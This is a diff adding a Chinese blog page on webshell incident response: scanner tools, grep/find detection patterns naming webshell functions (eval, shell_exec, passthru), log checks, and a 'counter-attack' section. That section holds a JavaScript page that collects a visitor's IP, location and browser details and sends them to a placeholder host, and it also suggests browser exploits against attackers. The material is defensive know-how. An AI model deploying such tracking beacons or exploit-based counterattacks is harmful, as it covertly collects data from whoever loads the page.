@@ -1,0 +1,487 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="麻薯">
+  <meta name="keywords" content="">
+  
+  <title>webshell溯源排查与反制 - Leticia&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Leticia's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default2.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="webshell溯源排查与反制">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-01-01 16:30" pubdate>
+        2022年1月1日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      16
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">webshell溯源排查与反制</h1>
+            
+            <div class="markdown-body">
+              <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>溯源排查中比较重要的一环是web突破口排查，攻击者通过web突破口入侵时，有极大的概率会写入webshell，本文介绍下常见的webshell排查方法和流程。</p>
+<h2 id="工具查杀"><a href="#工具查杀" class="headerlink" title="工具查杀"></a>工具查杀</h2><p>使用d盾、安全狗、护卫神等webshell查杀工具查杀web目录</p>
+<p>d盾：<br><a target="_blank" rel="noopener" href="http://www.d99net.net/">http://www.d99net.net/</a></p>
+<p>网站安全狗：<br><a target="_blank" rel="noopener" href="https://www.safedog.cn/website_safedog.html">https://www.safedog.cn/website_safedog.html</a></p>
+<p>百度webshell查杀引擎：<br><a target="_blank" rel="noopener" href="https://scanner.baidu.com/#/pages/intro">https://scanner.baidu.com/#/pages/intro</a></p>
+<h2 id="手工查杀"><a href="#手工查杀" class="headerlink" title="手工查杀"></a>手工查杀</h2><p>由于某些变种webshell查杀工具很难发现，所以有些时候需要手工从其他维度去查杀，比如修改时间，日志，备份对比等。</p>
+<h3 id="上传目录关键字查找"><a href="#上传目录关键字查找" class="headerlink" title="上传目录关键字查找"></a>上传目录关键字查找</h3><p>上传目录是最有可能存在webshell的，一般来说需要优先排查上传目录</p>
+<h4 id="脚本代码排查"><a href="#脚本代码排查" class="headerlink" title="脚本代码排查"></a>脚本代码排查</h4><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> -rn php upload/<br></code></pre></td></tr></table></figure>
+
+<h4 id="关键字排查"><a href="#关键字排查" class="headerlink" title="关键字排查"></a>关键字排查</h4><p>eval、system、assert、phpspy、c99sh、milw0rm、gunerpress、shell_exec、passthru、bash等关键字</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">find /www/upload -name <span class="hljs-string">&quot;*.php&quot;</span> |<span class="hljs-type">xargs</span> egrep &#x27;<span class="hljs-built_in">assert</span>|<span class="hljs-type">bash</span>|<span class="hljs-type">system</span>|<span class="hljs-type">phpspy</span>|<span class="hljs-type">c99sh</span>|<span class="hljs-type">milw0rm</span>|<span class="hljs-type">eval</span>|<span class="hljs-type">\(gunerpress</span>|<span class="hljs-type">\(base64_decoolcode</span>|<span class="hljs-type">spider_bc</span>|<span class="hljs-type">shell_exec</span>|<span class="hljs-type">passthru</span>|<span class="hljs-type">\(\$\_</span>\POST\[|<span class="hljs-type">eval</span>\(|<span class="hljs-type">file_put_contents</span>|<span class="hljs-type">base64_decode</span>&#x27;<br></code></pre></td></tr></table></figure>
+
+<h3 id="web非上传目录排查增删查改"><a href="#web非上传目录排查增删查改" class="headerlink" title="web非上传目录排查增删查改"></a>web非上传目录排查增删查改</h3><p>如果上传目录没有发现webshell，那么有可能攻击者使用了除web上传接口的其他途径写入了文件，如命令执行等，此时需要排查web目录的非上传路径。</p>
+<h4 id="备份对比"><a href="#备份对比" class="headerlink" title="备份对比"></a>备份对比</h4><p>对比非常传目录前后文件变动，寻找可疑文件，再进一步关键字匹配分析</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">vimdiff &lt;(cd <span class="hljs-regexp">/tmp/</span><span class="hljs-number">1.1</span>; <span class="hljs-keyword">find</span> . | <span class="hljs-keyword">sort</span>) &lt;(cd <span class="hljs-regexp">/tmp/</span><span class="hljs-number">1.2</span>; <span class="hljs-keyword">find</span> . | <span class="hljs-keyword">sort</span>) <br></code></pre></td></tr></table></figure>
+
+<h4 id="时间戳排查"><a href="#时间戳排查" class="headerlink" title="时间戳排查"></a>时间戳排查</h4><p>跟据情况调取短期内改动文件分析</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -mtime -10 -mtime +1 2&gt;/</span>dev/<span class="hljs-keyword">null</span> #一天前，十天内变动的文件<br></code></pre></td></tr></table></figure>
+
+
+<h4 id="文件名排查"><a href="#文件名排查" class="headerlink" title="文件名排查"></a>文件名排查</h4><p>使用tree命令列举整个web目录文件，然后排查可疑文件</p>
+<p>windows linux都可用</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">tree <span class="hljs-regexp">/var/</span>www/<br></code></pre></td></tr></table></figure>
+
+<h3 id="日志排查"><a href="#日志排查" class="headerlink" title="日志排查"></a>日志排查</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cat <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/apache2/</span>access.log | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;antSword&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="反向利用"><a href="#反向利用" class="headerlink" title="反向利用"></a>反向利用</h3><h4 id="1-篡改webshell页面利用js获取攻击者信息。"><a href="#1-篡改webshell页面利用js获取攻击者信息。" class="headerlink" title="1.篡改webshell页面利用js获取攻击者信息。"></a>1.篡改webshell页面利用js获取攻击者信息。</h4><p>利用js获取信息例子</p>
+<p>可获取对方ip、系统时间、浏览器各项信息等</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>	<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br>	<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript">	<span class="hljs-built_in">Date</span>.prototype.Format = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">fmt</span>) </span>&#123;</span><br><span class="javascript">    <span class="hljs-keyword">var</span> o = &#123;</span><br><span class="javascript">        <span class="hljs-string">&quot;M+&quot;</span>: <span class="hljs-built_in">this</span>.getMonth() + <span class="hljs-number">1</span>, <span class="hljs-comment">// 月份</span></span><br><span class="javascript">        <span class="hljs-string">&quot;d+&quot;</span>: <span class="hljs-built_in">this</span>.getDate(), <span class="hljs-comment">// 日</span></span><br><span class="javascript">        <span class="hljs-string">&quot;h+&quot;</span>: <span class="hljs-built_in">this</span>.getHours(), <span class="hljs-comment">// 小时</span></span><br><span class="javascript">        <span class="hljs-string">&quot;m+&quot;</span>: <span class="hljs-built_in">this</span>.getMinutes(), <span class="hljs-comment">// 分</span></span><br><span class="javascript">        <span class="hljs-string">&quot;s+&quot;</span>: <span class="hljs-built_in">this</span>.getSeconds(), <span class="hljs-comment">// 秒</span></span><br><span class="javascript">        <span class="hljs-string">&quot;q+&quot;</span>: <span class="hljs-built_in">Math</span>.floor((<span class="hljs-built_in">this</span>.getMonth() + <span class="hljs-number">3</span>) / <span class="hljs-number">3</span>), <span class="hljs-comment">// 季度</span></span><br><span class="javascript">        <span class="hljs-string">&quot;S&quot;</span>: <span class="hljs-built_in">this</span>.getMilliseconds() <span class="hljs-comment">// 毫秒</span></span><br>    &#125;;<br><span class="javascript">    <span class="hljs-keyword">if</span> (<span class="hljs-regexp">/(y+)/</span>.test(fmt))</span><br><span class="javascript">        fmt = fmt.replace(<span class="hljs-built_in">RegExp</span>.$1, (<span class="hljs-built_in">this</span>.getFullYear() + <span class="hljs-string">&quot;&quot;</span>).substr(<span class="hljs-number">4</span> - <span class="hljs-built_in">RegExp</span>.$1.length));</span><br><span class="javascript">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> k <span class="hljs-keyword">in</span> o)</span><br><span class="javascript">        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span> <span class="hljs-built_in">RegExp</span>(<span class="hljs-string">&quot;(&quot;</span> + k + <span class="hljs-string">&quot;)&quot;</span>).test(fmt)) fmt = fmt.replace(<span class="hljs-built_in">RegExp</span>.$1, (<span class="hljs-built_in">RegExp</span>.$1.length == <span class="hljs-number">1</span>) ? (o[k]) : ((<span class="hljs-string">&quot;00&quot;</span> + o[k]).substr((<span class="hljs-string">&quot;&quot;</span> + o[k]).length)));</span><br><span class="javascript">            <span class="hljs-keyword">return</span> fmt;</span><br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://pv.sohu.com/cityjson?ie=utf-8&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <br>		<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span> <br><span class="javascript">		      <span class="hljs-built_in">document</span>.write(returnCitySN[<span class="hljs-string">&quot;cip&quot;</span>]+<span class="hljs-string">&#x27;,&#x27;</span>+returnCitySN[<span class="hljs-string">&quot;cname&quot;</span>]+<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>) </span><br>		<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="javascript">		<span class="hljs-keyword">let</span> time = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>().Format(<span class="hljs-string">&quot;yyyy-MM-dd hh:mm:ss&quot;</span>)</span><br><span class="javascript">		<span class="hljs-built_in">document</span>.write(time+<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>)</span><br>		<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="javascript">    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;userAgent: &quot;</span> + navigator.userAgent + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="javascript">    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;appName: &quot;</span> + navigator.appName + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="javascript">    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;appCodeName: &quot;</span> + navigator.appCodeName + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="javascript">    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;appVersion: &quot;</span> + navigator.appVersion + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="javascript">    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;appMinorVersion: &quot;</span> + navigator.appMinorVersion + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="javascript">    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;platform: &quot;</span> + navigator.platform + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="javascript">    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;cookieEnabled: &quot;</span> + navigator.cookieEnabled + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="javascript">    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;onLine: &quot;</span> + navigator.onLine + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="javascript">    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;userLanguage: &quot;</span> + navigator.language + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="javascript">    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;mimeTypes.description: &quot;</span> + navigator.mimeTypes[<span class="hljs-number">1</span>].description + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="javascript">    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;mimeTypes.type: &quot;</span> + navigator.mimeTypes[<span class="hljs-number">1</span>].type + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="javascript">    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;plugins.description: &quot;</span> + navigator.plugins[<span class="hljs-number">3</span>].description + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="javascript">	<span class="hljs-keyword">var</span> str_all = returnCitySN[<span class="hljs-string">&quot;cip&quot;</span>]+<span class="hljs-string">&#x27;,&#x27;</span>+returnCitySN[<span class="hljs-string">&quot;cname&quot;</span>]+<span class="hljs-string">&#x27;,&#x27;</span>+time+<span class="hljs-string">&#x27;,&#x27;</span>+navigator.userAgent+<span class="hljs-string">&#x27;,&#x27;</span>+navigator.appVersion+<span class="hljs-string">&#x27;,&#x27;</span>+navigator.platform</span><br><span class="javascript">	<span class="hljs-keyword">var</span> url = <span class="hljs-string">&quot;http://xx.xx.xx.xx:8000/?info=&quot;</span>+str_all</span><br><span class="javascript">	<span class="hljs-keyword">var</span> request = <span class="hljs-keyword">new</span> XMLHttpRequest();</span><br><span class="javascript">	request.open(<span class="hljs-string">&quot;GET&quot;</span>,url)</span><br>	request.send();<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>	<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后接收服务器写一个小处理脚本将其保存下来</p>
+<p>为求方便也可以使用xss平台来接收</p>
+<h4 id="2-利用浏览器漏洞反制攻击者。"><a href="#2-利用浏览器漏洞反制攻击者。" class="headerlink" title="2.利用浏览器漏洞反制攻击者。"></a>2.利用浏览器漏洞反制攻击者。</h4><p>可架设攻击浏览器历史漏洞的页面，但是成功概率不高</p>
+<h4 id="3-反制webshell管理工具"><a href="#3-反制webshell管理工具" class="headerlink" title="3.反制webshell管理工具"></a>3.反制webshell管理工具</h4><p>可参考文章《端内钓鱼，反制蚁剑》</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/WNv9nPWvKudwimtYTd1zDQ">https://mp.weixin.qq.com/s/WNv9nPWvKudwimtYTd1zDQ</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/webshell/">webshell</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/webshell/">webshell</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/">溯源排查</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/01/06/linux%E8%BF%9B%E7%A8%8B%E9%9A%90%E5%8C%BF/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">linux进程隐匿</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/12/21/include%E6%96%B9%E5%BC%8Fwebshell/">
+                        <span class="hidden-mobile">include方式webshell</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
